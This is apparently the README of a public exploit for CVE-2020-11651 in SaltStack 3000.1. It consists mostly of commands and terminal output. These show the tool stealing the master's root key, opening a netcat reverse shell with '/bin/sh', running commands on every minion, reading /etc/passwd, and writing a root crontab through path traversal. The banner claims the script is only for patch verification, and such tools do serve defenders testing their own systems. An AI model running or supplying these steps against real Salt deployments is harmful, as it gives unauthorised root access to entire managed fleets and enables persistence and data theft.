# Saltstack-3000.1 Remote-Code-Execution

## Installation
Create a virtual env
```
python3 -m venv venv
source venv/bin/activate
```

Install requirements
```
pip install -r requirements
```

Exploit
```
exploit.py --master IP
```

## Usage

Default operation (without arguments) is to obtain the root key for the given master:

```
root@p314d0:~/salt# python3 exploit.py --master 192.168.137.62
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
root@p314d0:~/salt#
```

Executing arbitrary commands on the master:

```
root@p314d0:~/salt# python3 exploit.py --master 192.168.115.130 --exec "nc 127.0.0.1 4444 -e /bin/sh"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
[+] Attemping to execute nc 127.0.0.1 4444 -e /bin/sh on 192.168.115.130
[+] Successfully scheduled job: 20200504153851746472
root@p314d0:~/salt#
```

The same, but on all minions:

```
root@p314d0:~/salt# python3 exploit.py --master 192.168.115.130 --exec-all="apt-get upgrade -y"
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.115.130:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: b5pKEa3Mbp/TD7TjdtUTLxnk0LIANRZXC+9XFNIChUr6ZwIrBZJtoZZ8plfiVx2ztcVxjK2E1OA=
[!] Lester, is this what you want? Hit ^C to abort.
[+] Attemping to execute 'apt-get upgrade -y' on all minions connected to 192.168.115.130
[+] Successfully submitted job to all minions.
root@p314d0:~/salt#
```

Files can be read with:

```
python3 exploit.py --master 192.168.137.62 --read /etc/passwd
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
[+] Checking salt-master (192.168.137.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: YW+X7MyAJUrsskh2mt7TkF3FvyJaWLbGfylEiu5AdjFu9Rr8ggmt+HuXNPmPn9rfU1T7rmGnPCY=
[+] Attemping to read /etc/passwd from 192.168.137.62
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
[...]
```

Files can be uploaded using `--upload-src` and `--upload-dest`. Note the destination must be a relative path:

```
root@p314d0:~/salt#  python2 exploit.py --upload-src evil.crontab --upload-dest ../../../../../../var/spool/cron/crontabs/root
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651...
[*] root key obtained: GkJiProN36+iZ53buhvhm3dWcC/7BZyEomu3lSFucQF9TkrCRfA32EIFAk/yyQMkCyqZyxjjp/E=
[-] Destination path must be relative
[+] Attemping to upload evil.crontab to ../../../../../../var/spool/cron/crontabs/root on 127.0.0.1
[ ] Wrote data to file /srv/salt/../../../../../../var/spool/cron/crontabs/root
```